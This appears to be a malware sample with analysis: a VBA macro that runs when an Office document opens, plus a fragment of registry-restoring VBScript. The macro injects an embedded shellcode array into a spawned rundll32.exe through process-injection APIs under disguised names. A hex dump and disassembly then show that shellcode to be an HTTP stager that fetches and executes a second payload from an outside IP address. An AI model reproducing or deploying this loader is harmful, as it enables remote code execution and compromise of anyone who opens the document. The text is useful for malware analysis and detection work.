objExcel.Quit

' Restore the registry to its old state
if action = "" then
	WshShell.RegDelete RegPath
else
	WshShell.RegWrite RegPath, action, "REG_DWORD"
end if

##-----------------------

Private Type PROCESS_INFORMATION
    hProcess As Long
    hThread As Long
    dwProcessId As Long
    dwThreadId As Long
End Type

Private Type STARTUPINFO
    cb As Long
    lpReserved As String
    lpDesktop As String
    lpTitle As String
    dwX As Long
    dwY As Long
    dwXSize As Long
    dwYSize As Long
    dwXCountChars As Long
    dwYCountChars As Long
    dwFillAttribute As Long
    dwFlags As Long
    wShowWindow As Integer
    cbReserved2 As Integer
    lpReserved2 As Long
    hStdInput As Long
    hStdOutput As Long
    hStdError As Long
End Type

#If VBA7 Then
    Private Declare PtrSafe Function CreateStuff Lib "kernel32" Alias "CreateRemoteThread" (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As LongPtr
    Private Declare PtrSafe Function AllocStuff Lib "kernel32" Alias "VirtualAllocEx" (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
    Private Declare PtrSafe Function WriteStuff Lib "kernel32" Alias "WriteProcessMemory" (ByVal hProcess As Long, ByVal lDest As LongPtr, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As LongPtr) As LongPtr
    Private Declare PtrSafe Function RunStuff Lib "kernel32" Alias "CreateProcessA" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
#Else
    Private Declare Function CreateStuff Lib "kernel32" Alias "CreateRemoteThread" (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As Long, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As Long
    Private Declare Function AllocStuff Lib "kernel32" Alias "VirtualAllocEx" (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long
    Private Declare Function WriteStuff Lib "kernel32" Alias "WriteProcessMemory" (ByVal hProcess As Long, ByVal lDest As Long, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As Long) As Long
    Private Declare Function RunStuff Lib "kernel32" Alias "CreateProcessA" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDriectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
#End If

Sub Auto_Open()
    Dim myByte As Long, myArray As Variant, offset As Long
    Dim pInfo As PROCESS_INFORMATION
    Dim sInfo As STARTUPINFO
    Dim sNull As String
    Dim sProc As String

#If VBA7 Then
    Dim rwxpage As LongPtr, res As LongPtr
#Else
    Dim rwxpage As Long, res As Long
#End If
    myArray = Array(-4,-24,-119,0,0,0,96,-119,-27,49,-46,100,-117,82,48,-117,82,12,-117,82,20,-117,114,40,15,-73,74,38,49,-1,49,-64,-84, _
60,97,124,2,44,32,-63,-49,13,1,-57,-30,-16,82,87,-117,82,16,-117,66,60,1,-48,-117,64,120,-123,-64,116,74,1,-48, _
80,-117,72,24,-117,88,32,1,-45,-29,60,73,-117,52,-117,1,-42,49,-1,49,-64,-84,-63,-49,13,1,-57,56,-32,117,-12,3, _
125,-8,59,125,36,117,-30,88,-117,88,36,1,-45,102,-117,12,75,-117,88,28,1,-45,-117,4,-117,1,-48,-119,68,36,36,91, _
91,97,89,90,81,-1,-32,88,95,90,-117,18,-21,-122,93,104,110,101,116,0,104,119,105,110,105,84,104,76,119,38,7,-1, _
-43,-24,-128,0,0,0,77,111,122,105,108,108,97,47,53,46,48,32,40,87,105,110,100,111,119,115,32,78,84,32,54,46, _
49,59,32,87,79,87,54,52,59,32,84,114,105,100,101,110,116,47,55,46,48,59,32,114,118,58,49,49,46,48,41,32, _
108,105,107,101,32,71,101,99,107,111,0,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88, _
88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88, _
88,88,88,88,88,0,89,49,-1,87,87,87,87,81,104,58,86,121,-89,-1,-43,-21,121,91,49,-55,81,81,106,3,81,81, _
104,80,0,0,0,83,80,104,87,-119,-97,-58,-1,-43,-21,98,89,49,-46,82,104,0,2,96,-124,82,82,82,81,82,80,104, _
-21,85,46,59,-1,-43,-119,-58,49,-1,87,87,87,87,86,104,45,6,24,123,-1,-43,-123,-64,116,68,49,-1,-123,-10,116,4, _
-119,-7,-21,9,104,-86,-59,-30,93,-1,-43,-119,-63,104,69,33,94,49,-1,-43,49,-1,87,106,7,81,86,80,104,-73,87,-32, _
11,-1,-43,-65,0,47,0,0,57,-57,116,-68,49,-1,-21,21,-21,73,-24,-103,-1,-1,-1,47,113,82,81,72,0,0,104,-16, _
-75,-94,86,-1,-43,106,64,104,0,16,0,0,104,0,0,64,0,87,104,88,-92,83,-27,-1,-43,-109,83,83,-119,-25,87,104, _
0,32,0,0,83,86,104,18,-106,-119,-30,-1,-43,-123,-64,116,-51,-117,7,1,-61,-123,-64,117,-27,88,-61,-24,55,-1,-1,-1, _
56,48,46,50,53,53,46,51,46,49,48,57,0)
    If Len(Environ("ProgramW6432")) > 0 Then
        sProc = Environ("windir") & "\\SysWOW64\\rundll32.exe"
    Else
        sProc = Environ("windir") & "\\System32\\rundll32.exe"
    End If

    res = RunStuff(sNull, sProc, ByVal 0&, ByVal 0&, ByVal 1&, ByVal 4&, ByVal 0&, sNull, sInfo, pInfo)

    rwxpage = AllocStuff(pInfo.hProcess, 0, UBound(myArray), &H1000, &H40)
    For offset = LBound(myArray) To UBound(myArray)
        myByte = myArray(offset)
        res = WriteStuff(pInfo.hProcess, rwxpage + offset, myByte, 1, ByVal 0&)
    Next offset
    res = CreateStuff(pInfo.hProcess, 0, 0, rwxpage, 0, 0, 0)
End Sub
Sub AutoOpen()
    Auto_Open
End Sub
Sub Workbook_Open()
    Auto_Open
End Sub

##-----------------------

Hex dump: fc e8 89 00 00 00 60 89 e5 31 d2 64 8b 52 30 8b 52 0c 8b 52 14 8b 72 28 0f b7 4a 26 31 ff 31 c0 ac 3c 61 7c 02 2c 20 c1 cf 0d 01 c7 e2 f0 52 57 8b 52 10 8b 42 3c 01 d0 8b 40 78 85 c0 74 4a 01 d0 50 8b 48 18 8b 58 20 01 d3 e3 3c 49 8b 34 8b 01 d6 31 ff 31 c0 ac c1 cf 0d 01 c7 38 e0 75 f4 03 7d f8 3b 7d 24 75 e2 58 8b 58 24 01 d3 66 8b 0c 4b 8b 58 1c 01 d3 8b 04 8b 01 d0 89 44 24 24 5b 5b 61 59 5a 51 ff e0 58 5f 5a 8b 12 eb 86 5d 68 6e 65 74 00 68 77 69 6e 69 54 68 4c 77 26 07 ff d5 e8 80 00 00 00 4d 6f 7a 69 6c 6c 61 2f 35 2e 30 20 28 57 69 6e 64 6f 77 73 20 4e 54 20 36 2e 31 3b 20 57 4f 57 36 34 3b 20 54 72 69 64 65 6e 74 2f 37 2e 30 3b 20 72 76 3a 31 31 2e 30 29 20 6c 69 6b 65 20 47 65 63 6b 6f 00 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 58 00 59 31 ff 57 57 57 57 51 68 3a 56 79 a7 ff d5 eb 79 5b 31 c9 51 51 6a 03 51 51 68 50 00 00 00 53 50 68 57 89 9f c6 ff d5 eb 62 59 31 d2 52 68 00 02 60 84 52 52 52 51 52 50 68 eb 55 2e 3b ff d5 89 c6 31 ff 57 57 57 57 56 68 2d 06 18 7b ff d5 85 c0 74 44 31 ff 85 f6 74 04 89 f9 eb 09 68 aa c5 e2 5d ff d5 89 c1 68 45 21 5e 31 ff d5 31 ff 57 6a 07 51 56 50 68 b7 57 e0 0b ff d5 bf 00 2f 00 00 39 c7 74 bc 31 ff eb 15 eb 49 e8 99 ff ff ff 2f 71 52 51 48 00 00 68 f0 b5 a2 56 ff d5 6a 40 68 00 10 00 00 68 00 00 40 00 57 68 58 a4 53 e5 ff d5 93 53 53 89 e7 57 68 00 20 00 00 53 56 68 12 96 89 e2 ff d5 85 c0 74 cd 8b 07 01 c3 85 c0 75 e5 58 c3 e8 37 ff ff ff 38 30 2e 32 35 35 2e 33 2e 31 30 39 00
0x00000000 fc               cld 
0x00000001 e889000000       call 0x0000008f
0x00000006 60               pushad 
0x00000007 89e5             mov ebp,esp
0x00000009 31d2             xor edx,edx
0x0000000b 648b5230         fs: mov edx,dword [edx + 48]
0x0000000f 8b520c           mov edx,dword [edx + 12]
0x00000012 8b5214           mov edx,dword [edx + 20]
0x00000015 8b7228           mov esi,dword [edx + 40]
0x00000018 0fb74a26         movzx ecx,word [edx + 38]
0x0000001c 31ff             xor edi,edi
0x0000001e 31c0             xor eax,eax
0x00000020 ac               lodsb 
0x00000021 3c61             cmp al,97
0x00000023 7c02             jl 0x00000027
0x00000025 2c20             sub al,32
0x00000027 c1cf0d           ror edi,13
0x0000002a 01c7             add edi,eax
0x0000002c e2f0             loop 0x0000001e
0x0000002e 52               push edx
0x0000002f 57               push edi
0x00000030 8b5210           mov edx,dword [edx + 16]
0x00000033 8b423c           mov eax,dword [edx + 60]
0x00000036 01d0             add eax,edx
0x00000038 8b4078           mov eax,dword [eax + 120]
0x0000003b 85c0             test eax,eax
0x0000003d 744a             jz 0x00000089
0x0000003f 01d0             add eax,edx
0x00000041 50               push eax
0x00000042 8b4818           mov ecx,dword [eax + 24]
0x00000045 8b5820           mov ebx,dword [eax + 32]
0x00000048 01d3             add ebx,edx
0x0000004a e33c             jecxz 0x00000088
0x0000004c 49               dec ecx
0x0000004d 8b348b           mov esi,dword [ebx + ecx * 4]
0x00000050 01d6             add esi,edx
0x00000052 31ff             xor edi,edi
0x00000054 31c0             xor eax,eax
0x00000056 ac               lodsb 
0x00000057 c1cf0d           ror edi,13
0x0000005a 01c7             add edi,eax
0x0000005c 38e0             cmp al,ah
0x0000005e 75f4             jnz 0x00000054
0x00000060 037df8           add edi,dword [ebp - 8]
0x00000063 3b7d24           cmp edi,dword [ebp + 36]
0x00000066 75e2             jnz 0x0000004a
0x00000068 58               pop eax
0x00000069 8b5824           mov ebx,dword [eax + 36]
0x0000006c 01d3             add ebx,edx
0x0000006e 668b0c4b         mov cx,word [ebx + ecx * 2]
0x00000072 8b581c           mov ebx,dword [eax + 28]
0x00000075 01d3             add ebx,edx
0x00000077 8b048b           mov eax,dword [ebx + ecx * 4]
0x0000007a 01d0             add eax,edx
0x0000007c 89442424         mov dword [esp + 36],eax
0x00000080 5b               pop ebx
0x00000081 5b               pop ebx
0x00000082 61               popad 
0x00000083 59               pop ecx
0x00000084 5a               pop edx
0x00000085 51               push ecx
0x00000086 ffe0             jmp eax
0x00000088 58               pop eax
0x00000089 5f               pop edi
0x0000008a 5a               pop edx
0x0000008b 8b12             mov edx,dword [edx]
0x0000008d eb86             jmp 0x00000015
0x0000008f 5d               pop ebp
0x00000090 686e657400       push 0x0074656e--> 'ten'
0x00000095 6877696e69       push 0x696e6977--> 'iniw'
0x0000009a 54               push esp
0x0000009b 684c772607       push 0x0726774c--> '&wL'
0x000000a0 ffd5             call ebp --> kernel32.dll!LoadLibraryA
0x000000a2 e880000000       call 0x00000127
0x000000a7 4d               dec ebp
0x000000a8 6f               outsd edx,dword [esi]
0x000000a9 7a69             jpe 0x00000114
0x000000ab 6c               insb byte [esi],edx
0x000000ac 6c               insb byte [esi],edx
0x000000ad 61               popad 
0x000000ae 2f               das 
0x000000af 352e302028       xor eax,0x2820302e
0x000000b4 57               push edi
0x000000b5 696e646f777320   imul ebp,dword [esi + 100],0x2073776f
0x000000bc 4e               dec esi
0x000000bd 54               push esp
0x000000be 2036             and byte [esi],dh
0x000000c0 2e313b           cs: xor dword [ebx],edi
0x000000c3 20574f           and byte [edi + 79],dl
0x000000c6 57               push edi
0x000000c7 36343b           ss: xor al,59
0x000000ca 20547269         and byte [edx + esi * 2 + 105],dl
0x000000ce 64656e           fsgs: outsb edx,byte [esi]
0x000000d1 742f             jz 0x00000102
0x000000d3 37               aaa 
0x000000d4 2e303b           cs: xor byte [ebx],bh
0x000000d7 207276           and byte [edx + 118],dh
0x000000da 3a31             cmp dh,byte [ecx]
0x000000dc 312e             xor dword [esi],ebp
0x000000de 3029             xor byte [ecx],ch
0x000000e0 206c696b         and byte [ecx + ebp * 2 + 107],ch
0x000000e4 65204765         gs: and byte [edi + 101],al
0x000000e8 636b6f           arpl word [ebx + 111],bp
0x000000eb 005858           add byte [eax + 88],bl
0x000000ee 58               pop eax
0x000000ef 58               pop eax
0x000000f0 58               pop eax
0x000000f1 58               pop eax
0x000000f2 58               pop eax
0x000000f3 58               pop eax
0x000000f4 58               pop eax
0x000000f5 58               pop eax
0x000000f6 58               pop eax
0x000000f7 58               pop eax
0x000000f8 58               pop eax
0x000000f9 58               pop eax
0x000000fa 58               pop eax
0x000000fb 58               pop eax
0x000000fc 58               pop eax
0x000000fd 58               pop eax
0x000000fe 58               pop eax
0x000000ff 58               pop eax
0x00000100 58               pop eax
0x00000101 58               pop eax
0x00000102 58               pop eax
0x00000103 58               pop eax
0x00000104 58               pop eax
0x00000105 58               pop eax
0x00000106 58               pop eax
0x00000107 58               pop eax
0x00000108 58               pop eax
0x00000109 58               pop eax
0x0000010a 58               pop eax
0x0000010b 58               pop eax
0x0000010c 58               pop eax
0x0000010d 58               pop eax
0x0000010e 58               pop eax
0x0000010f 58               pop eax
0x00000110 58               pop eax
0x00000111 58               pop eax
0x00000112 58               pop eax
0x00000113 58               pop eax
0x00000114 58               pop eax
0x00000115 58               pop eax
0x00000116 58               pop eax
0x00000117 58               pop eax
0x00000118 58               pop eax
0x00000119 58               pop eax
0x0000011a 58               pop eax
0x0000011b 58               pop eax
0x0000011c 58               pop eax
0x0000011d 58               pop eax
0x0000011e 58               pop eax
0x0000011f 58               pop eax
0x00000120 58               pop eax
0x00000121 58               pop eax
0x00000122 58               pop eax
0x00000123 58               pop eax
0x00000124 58               pop eax
0x00000125 58               pop eax
0x00000126 005931           add byte [ecx + 49],bl
0x00000129 ff5757           call dword [edi + 87]
0x0000012c 57               push edi
0x0000012d 57               push edi
0x0000012e 51               push ecx
0x0000012f 683a5679a7       push 0xa779563a--> 'yV:'
0x00000134 ffd5             call ebp --> wininet.dll!InternetOpenA
0x00000136 eb79             jmp 0x000001b1
0x00000138 5b               pop ebx
0x00000139 31c9             xor ecx,ecx
0x0000013b 51               push ecx
0x0000013c 51               push ecx
0x0000013d 6a03             push 3
0x0000013f 51               push ecx
0x00000140 51               push ecx
0x00000141 6850000000       push 80
0x00000146 53               push ebx
0x00000147 50               push eax
0x00000148 6857899fc6       push 0xc69f8957
0x0000014d ffd5             call ebp --> wininet.dll!InternetConnectA
0x0000014f eb62             jmp 0x000001b3
0x00000151 59               pop ecx
0x00000152 31d2             xor edx,edx
0x00000154 52               push edx
0x00000155 6800026084       push 0x84600200
0x0000015a 52               push edx
0x0000015b 52               push edx
0x0000015c 52               push edx
0x0000015d 51               push ecx
0x0000015e 52               push edx
0x0000015f 50               push eax
0x00000160 68eb552e3b       push 0x3b2e55eb--> ';.U'
0x00000165 ffd5             call ebp --> wininet.dll!HttpOpenRequestA
0x00000167 89c6             mov esi,eax
0x00000169 31ff             xor edi,edi
0x0000016b 57               push edi
0x0000016c 57               push edi
0x0000016d 57               push edi
0x0000016e 57               push edi
0x0000016f 56               push esi
0x00000170 682d06187b       push 0x7b18062d--> '{-'
0x00000175 ffd5             call ebp --> wininet.dll!HttpSendRequestA
0x00000177 85c0             test eax,eax
0x00000179 7444             jz 0x000001bf
0x0000017b 31ff             xor edi,edi
0x0000017d 85f6             test esi,esi
0x0000017f 7404             jz 0x00000185
0x00000181 89f9             mov ecx,edi
0x00000183 eb09             jmp 0x0000018e
0x00000185 68aac5e25d       push 0x5de2c5aa
0x0000018a ffd5             call ebp --> kernel32.dll!GetLastError
0x0000018c 89c1             mov ecx,eax
0x0000018e 6845215e31       push 0x315e2145--> '1^!E'
0x00000193 ffd5             call ebp
0x00000195 31ff             xor edi,edi
0x00000197 57               push edi
0x00000198 6a07             push 7
0x0000019a 51               push ecx
0x0000019b 56               push esi
0x0000019c 50               push eax
0x0000019d 68b757e00b       push 0x0be057b7--> 'W'
0x000001a2 ffd5             call ebp --> wininet.dll!InternetErrorDlg
0x000001a4 bf002f0000       mov edi,0x00002f00
0x000001a9 39c7             cmp edi,eax
0x000001ab 74bc             jz 0x00000169
0x000001ad 31ff             xor edi,edi
0x000001af eb15             jmp 0x000001c6
0x000001b1 eb49             jmp 0x000001fc
0x000001b3 e899ffffff       call 0x00000151
0x000001b8 2f               das 
0x000001b9 7152             jno 0x0000020d
0x000001bb 51               push ecx
0x000001bc 48               dec eax
0x000001bd 0000             add byte [eax],al
0x000001bf 68f0b5a256       push 0x56a2b5f0
0x000001c4 ffd5             call ebp --> kernel32.dll!ExitProcess
0x000001c6 6a40             push 64
0x000001c8 6800100000       push 4096
0x000001cd 6800004000       push 0x00400000
0x000001d2 57               push edi
0x000001d3 6858a453e5       push 0xe553a458--> 'SX'
0x000001d8 ffd5             call ebp --> kernel32.dll!VirtualAlloc
0x000001da 93               xchg eax,ebx
0x000001db 53               push ebx
0x000001dc 53               push ebx
0x000001dd 89e7             mov edi,esp
0x000001df 57               push edi
0x000001e0 6800200000       push 0x00002000
0x000001e5 53               push ebx
0x000001e6 56               push esi
0x000001e7 68129689e2       push 0xe2899612
0x000001ec ffd5             call ebp --> wininet.dll!InternetReadFile
0x000001ee 85c0             test eax,eax
0x000001f0 74cd             jz 0x000001bf
0x000001f2 8b07             mov eax,dword [edi]
0x000001f4 01c3             add ebx,eax
0x000001f6 85c0             test eax,eax
0x000001f8 75e5             jnz 0x000001df
0x000001fa 58               pop eax
0x000001fb c3               ret 
0x000001fc e837ffffff       call 0x00000138
0x00000201 3830             cmp byte [eax],dh
0x00000203 2e3235352e332e   cs: xor dh,byte [0x2e332e35]
0x0000020a 3130             xor dword [eax],esi
0x0000020c 3900             cmp dword [eax],eax

Byte Dump:
......`..1.d.R0.R.R..r(..J&1.1..<a|.,......RW.R..B<...@x..tJ..P.H..X...<I.4...1.1......8.u..}.;}$u.X.X$..f.K.X.........D$$[[aYZQ..X_Z....]hnet.hwiniThLw&........Mozilla/5.0(WindowsNT6.1;WOW64;Trident/7.0;rv:11.0)likeGecko.XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX.Y1.WWWWQh:Vy....y[1.QQj.QQhP...SPhW......bY1.Rh..`.RRRQRPh.U.;....1.WWWWVh-..{....tD1...t....h...]....hE!^1..1.Wj.QVPh.W...../..9.t.1....I...../qRQH..h...V..j@h....h..@.WhX.S....SS..Wh...SVh........t.......u.X..7...80.255.3.109.
